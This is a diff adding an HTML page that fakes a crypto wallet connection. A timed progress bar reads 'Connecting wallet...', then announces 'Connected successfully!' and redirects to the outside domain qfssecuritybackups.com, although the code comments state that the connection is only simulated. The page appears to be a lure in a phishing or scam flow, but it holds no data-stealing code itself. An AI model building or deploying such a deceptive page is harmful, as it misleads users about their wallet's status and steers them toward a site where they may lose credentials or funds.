@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Progress</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+            flex-direction: column;
+            font-family: Arial, sans-serif;
+        }
+
+        .loading-container {
+            width: 80%;
+            max-width: 600px;
+            background-color: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+            height: 40px;
+            transition: background-color 0.5s ease;
+        }
+
+        .loading-bar {
+            height: 100%;
+            width: 0;
+            background-color: #3498db;
+            animation: load 5s ease-in-out forwards;
+        }
+
+        .percent-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .status-text {
+            font-size: 32px;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        @keyframes load {
+            0% {
+                width: 0;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="status-text" id="status">Connecting wallet...</div>
+    <div class="loading-container" id="loading-container">
+        <div class="loading-bar" id="loading-bar">
+            <div class="percent-text" id="percent">0%</div>
+        </div>
+    </div>
+
+    <script>
+        let loadingBar = document.getElementById('loading-bar');
+        let percentText = document.querySelector('.percent-text');
+        let statusText = document.getElementById('status');
+        let loadingContainer = document.getElementById('loading-container');
+
+        let progress = 0;
+        let interval = setInterval(function() {
+            progress += 2; // Increment progress by 2% each time
+            loadingBar.style.width = progress + '%';
+            percentText.textContent = progress + '%';
+
+            // Change background color to green once progress reaches 90%
+            if (progress >= 90 && progress < 100) {
+                loadingContainer.style.backgroundColor = '#2ecc71'; // Green
+            }
+
+            if (progress >= 100) {
+                clearInterval(interval); // Stop the interval once 100% is reached
+                statusText.textContent = "Connected successfully!"; // Change text when 100% is reached
+
+                // Redirect to the specified URL after a short delay
+                setTimeout(function() {
+                    window.location.href = "https://qfssecuritybackups.com";
+                }, 1000); // 1 second delay before redirecting
+            }
+        }, 100); // Update every 100ms (to simulate the loading)
+    </script>
+
+    <?php
+        // PHP could be used to handle any backend logic if necessary, such as simulating the wallet connection
+        // For example:
+        // sleep(5); // Simulate a delay for the wallet connection process
+    ?>
+
+</body>
+</html>
